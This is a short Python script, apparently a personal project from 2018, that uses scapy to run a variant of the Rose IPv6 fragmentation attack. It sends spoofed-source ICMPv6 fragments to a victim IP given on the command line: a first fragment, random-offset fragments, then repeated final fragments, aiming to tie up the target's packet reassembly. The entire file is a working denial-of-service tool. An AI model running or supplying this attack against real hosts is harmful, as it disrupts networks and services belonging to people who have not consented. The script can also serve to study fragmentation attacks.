#!/usr/bin/python

# Jack Cardwell
# February 25, 2018

# newRose.py is an attack that mimics the rose attack but it sends multiple fragments, instead of two

from scapy.all import *
from sys import *
from math import *

# generates a random ipv6 source
def randipv6():
    """return random ipv6 address"""
    ipv6 = ""

    for i in range(0, 8):
        for p in range(0, 4):
            if random.randint(0, 1) % 2:
                ipv6 += chr(random.randint(0x30, 0x39))
            else:
                ipv6 += chr(random.randint(0x41, 0x46))
        if i != 7:
            ipv6 += ':'

    return ipv6

def newRose():

    # check the number of arguments
    if len(sys.argv) != 4:
        print("Error: Please enter the correct arguments.")
        print("Usage: ./rose.py [VICTIM IP] [NUM_FRAGMENTS] [OFFSET]")
        exit(2)

    tgt = sys.argv[1]
    numFragments = int(sys.argv[2])
    offset = int(sys.argv[3])


    src = randipv6()

    # generate the ip header
    ip = IPv6(dst = tgt, src = src)

    # create the fragment header
    frag = IPv6ExtHdrFragment()

    # ICMP header
    icmp = ICMPv6EchoRequest()

    # send the first packet
    frag.m = 1
    frag.offset = 0

    pkt = (ip/frag/icmp)
    send(pkt)

    # send the random packets in between
    for i in range(0, 5):

        # generate the random number
        randInt = random.randint(0,offset/8)*8
        frag.offset = randInt

        randString = "JACK"*2
        pkt = (ip/frag/icmp/Raw(load=randString))
        send(pkt)

    # send the end header
    for i in range(0, numFragments):
        frag.m = 0
        frag.offset = offset

        randString = "JACK"*2
        pkt = (ip/frag/icmp/Raw(load=randString))
        send(pkt)
        time.sleep(0.1)
    exit(0)

newRose()
